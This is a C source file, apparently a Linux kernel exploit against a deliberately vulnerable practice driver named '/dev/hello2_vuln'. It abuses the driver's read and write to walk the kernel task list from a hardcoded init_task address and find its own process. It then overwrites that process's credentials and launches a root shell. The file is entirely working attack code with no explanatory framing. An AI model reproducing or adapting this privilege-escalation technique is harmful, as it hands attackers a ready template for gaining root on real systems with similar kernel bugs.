#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>


#define INIT_TASK 0xffffffff82614940
#define OFFSET_TO_HEAD 0x3e8
#define OFFSET_TO_PID 0x4e8
#define HEAD_TO_PID 0x100
#define OFFSET_TO_CRED 0x6a0
#define HEAD_TO_CRED 0x2b8
#define BUFFER_LEN 256
#define DRIVER_FILE "/dev/hello2_vuln"

char buffer[256] = {0};
int FD = 0;

int check_fd(){
	if(FD == 0){
		printf("[-] Could not open file\n");
		exit(-1);
	}
}

void write_device(int fd, const void* buffer, ssize_t size){
	int ret = write(fd, buffer, size);
	if(ret < 0){
		printf("[-] Failed to write to device file\n");
		exit(-1);
	}
}

void read_device(int fd, const void* buffer, ssize_t size){
	int ret = read(fd, buffer, size);
	if(ret < 0){
		printf("[-] Failed to read from device file\n");
		exit(-1);
	}
}

void read_kernel(void *address, const char* buffer, ssize_t size){
	check_fd();
	write_device(FD, address, size);
	read_device(FD, buffer, BUFFER_LEN);
}

void write_kernel(void *address, const char* str_to_send, ssize_t size){
	check_fd();
	write_device(FD, str_to_send, size);
	read_device(FD, address, size);
}

int main(){
	FD = open(DRIVER_FILE, O_RDWR);

	int pid = getpid();
	printf("[+] PID = %d\n", pid);

	printf("[+] Reading head from init_tast...\n");
	void *target = INIT_TASK + OFFSET_TO_HEAD;
	char *buf;
    read_kernel(target, &buf, sizeof(char*));
	printf("[+] Kernel read\n");

	printf("[+] Searching for the PID of this program...\n");
	int pid_of_task = 0;
	read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));

	while(pid_of_task != pid){
		read_kernel(buf, &buf, sizeof(char*));
		read_kernel((buf+HEAD_TO_PID), &pid_of_task, sizeof(int));
		printf("\t[+] PID of task: %d\n", pid_of_task);
	}

	char *addr_to_task = buf - OFFSET_TO_HEAD;
	printf("[+] Address to our task: %p\n", addr_to_task);

	char *addr_to_cred;
	read_kernel(buf + HEAD_TO_CRED, &addr_to_cred, sizeof(char*));
	printf("[+] Address to cred: %p\n", addr_to_cred);
	
    printf("[+] Now setting our cred to 0...\n");
	long long n = 0;
	write_kernel(addr_to_cred, &n, sizeof(long long));
	printf("[+] Root shell gained!\n");
    system("/bin/sh");	

	return 0;
}


